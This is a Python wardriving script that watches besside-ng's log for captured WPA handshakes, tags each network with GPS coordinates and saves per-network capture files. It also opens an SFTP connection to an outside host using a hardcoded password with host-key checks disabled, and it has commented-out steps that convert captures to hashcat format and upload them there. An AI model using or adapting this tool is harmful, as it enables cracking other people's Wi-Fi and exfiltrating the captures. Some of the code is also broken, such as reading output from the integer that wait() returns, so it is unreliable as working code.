import os
import sys
import ftplib
import os.path
import subprocess
import gpsd
from datetime import datetime
import time
import pysftp

cnopts = pysftp.CnOpts()
cnopts.hostkeys = None   
sftp = pysftp.Connection('aaron.shivs.org', username='aaron', password='ashivji84',port=27000,cnopts=cnopts) 

cmd = ['gpsd', '/dev/ttyUSB0']
subprocess.Popen(cmd).wait()
if not os.path.exists("w4rdrive.log"):
    f=open("w4rdrive.log","w")
    f.write("Lawgs\n")
    f.close()
    
gpsd.connect()

count=0

logSize=os.path.getsize('besside.log')
try:
    while True:
        time.sleep(.5)
        if logSize !=os.path.getsize('besside.log'):
            line = str(subprocess.check_output(['tail', '-1', "besside.log"]),'utf-8')
            line=line.split(" ")
            line=line[0]
            if line!="#":
                loc=str(gpsd.get_current())
                loc=loc.split()
                f=open("w4rdrive.log","a")
                print ("Got handshake "+line)
                f.write(line + "," + loc[3]+ ',' + loc[4] +"\n")
                f.close()
                time.sleep(1)
                if(os.path.getsize('wpa.cap') > 24):
                    cmd = ['cp', 'wpa.cap', line+".cap"]
                    process=subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
                    while True:
                        out = process.stdout.read(1)
                        if out == '' and process.poll() != None:
                            break
                        if out != '':
                            sys.stdout.write(out)
                            sys.stdout.flush()
                    time.sleep(1)
                    cmd=['cp','tmp','wpa.cap']
                    subprocess.Popen(cmd).wait()
                    time.sleep(1)
                    #cmd=['/usr/bin/cap2hccapx.bin',line+".cap",line+".hccapx"]
                    subprocess.Popen(cmd).wait()
                    time.sleep(1)
                    #sftp.put(line+".hccapx",line+".hccapx")
                    #os.system("cp wpa.cap " + line+".cap")
                    #os.system("rm wpa.cap")
                    #os.system("cp tmp wpa.cap")
                    count=count+1
        logSize=os.path.getsize('besside.log')
except KeyboardInterrupt:
    sftp.close()
    print ("BYE")
    
    
